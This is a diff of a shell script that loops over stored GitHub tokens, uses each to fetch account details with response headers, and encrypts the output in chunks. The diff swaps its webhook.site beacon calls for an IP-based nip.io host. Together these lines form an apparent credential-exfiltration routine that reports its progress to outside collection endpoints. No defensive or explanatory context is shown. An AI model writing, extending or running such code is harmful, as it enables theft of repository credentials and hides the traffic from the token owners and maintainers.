@@ -26,7 +26,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		# ------------------------------------------------------- fetch the data --
 		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"
 		string="$user_info"     # includes response headers because of -i
-		curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/got-user-info
+		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/got-user-info
 
 		# ------------------------------------------------ chunked encryption -----
 
@@ -38,7 +38,7 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		    i=$(( i + CHUNK_SIZE ))
 		done
 
-		curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/finished-loop
+		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
 		# ------------------------------- join chunks ('.' i never in base64) ----
 		encrypted_string="$(printf '%s.' "${chunks[@]}")"
 		encrypted_string="${encrypted_string%.}"
